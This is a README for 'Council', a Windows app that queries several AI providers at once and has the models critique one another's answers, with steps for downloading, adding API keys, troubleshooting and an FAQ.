# 🧠 Council - Compare AI models for better answers

[![](https://img.shields.io/badge/Download-Council-blue)](https://github.com/Palmerbeetling15/Council)

Council helps you find the best answers by questioning multiple AI models at once. You get results from services like OpenAI, Anthropic, and Google side-by-side. The app asks each model to critique the others, which helps you pick the most accurate response.

## 📥 How to download and install

1. Visit the [official releases page](https://github.com/Palmerbeetling15/Council) to find the application files.
2. Select the version that matches your computer system.
3. Click the download link to save the file to your hard drive.
4. Locate the downloaded file in your folder.
5. Double-click the file to start the installation.
6. Follow the instructions on the screen to finish the setup.
7. Open the Council application from your desktop or applications folder.

## 🔑 Setting up your accounts

Council requires your own API keys to function. This keeps your data private.

1. Create accounts with AI providers such as OpenAI, Anthropic, or Google.
2. Log into the developer dashboard for each provider.
3. Locate the section labeled API Keys.
4. Create a new key.
5. Copy the key to your clipboard.
6. Open Council.
7. Navigate to the Settings menu.
8. Paste your key into the text field for that specific service.
9. Repeat these steps for every AI model you want to use.

## 🤖 Using the application

The main interface lets you type a question once. Council sends this question to every active model at the same time. The models generate their answers in parallel. You see a list of responses in the central window.

Each model reviews the work of the other models. This critique layer helps verify facts and improves output quality. Read the critiques to see where models agree or disagree. After you review the answers and the critiques, you choose the result that serves your needs best.

## ⚙️ Privacy and your data

Council does not store your information on external servers. The app works directly on your machine. Your API keys stay on your computer. When you send a question, it travels from your computer to the AI provider. No third party monitors your activity or logs your questions.

## 🛠️ System requirements

To use Council, ensure your computer meets these basic needs:

* Windows 10 or Windows 11.
* A stable internet connection for model responses.
* At least 500 MB of space on your drive.
* A modern web browser to manage your API keys.

## 🧩 Troubleshooting common issues

If the app fails to show an answer, check these items:

* Verify your internet connection.
* Check if your API keys are still active in your developer dashboard.
* Ensure you have enough credit in your AI provider account.
* Close the app and launch it again.
* Uninstall the app and install the latest version from the download link.

## 📋 Features

* Multi-model input: Ask a single question and receive responses from different AI engines.

* Privacy-first design: All keys and questions remain under your control.
* Parallel results: Save time by viewing all answers simultaneously.
* Simplified decision making: The interface highlights strengths and weaknesses of each response.

## 💡 Frequently asked questions

Does Council charge for AI usage?
Council itself is free. You pay the AI companies directly based on how much you use their services. Check their websites for current rates.

Which models work with Council?
The app supports OpenAI, Anthropic, and Google models. Check the settings menu for a list of compatible options.

Can I use Local AI models?
Yes, Council integrates with Ollama if you run it on your machine. This allows you to use open-source models without relying on cloud services.

Why does the app ask for my own keys?
This ensures you own your integration. You avoid middleman fees and keep your usage private.

Is my data shared?
No. Data travels between your computer and the AI provider only. Council acts as a user interface for these requests.
